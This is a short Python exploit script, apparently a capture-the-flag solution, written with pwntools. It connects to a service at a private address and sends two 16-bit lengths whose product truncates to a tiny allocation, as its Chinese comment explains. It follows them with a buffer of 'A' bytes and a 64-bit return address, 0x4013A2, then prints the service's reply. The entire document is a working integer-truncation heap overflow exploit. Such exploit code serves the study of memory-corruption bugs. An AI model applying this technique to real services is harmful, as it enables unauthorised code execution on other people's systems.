from pwn import *

r = remote("172.17.0.13", 14669)

# v3 = 3, v4 = 21846
# 3 * 21846 = 0x10002，16 位截断后 malloc(2)
payload  = p16(3)
payload += p16(21846)
payload += b"A" * 0x20
payload += p64(0x4013A2)

r.send(payload)
# EOF
r.shutdown("send")

print(r.recvall().decode())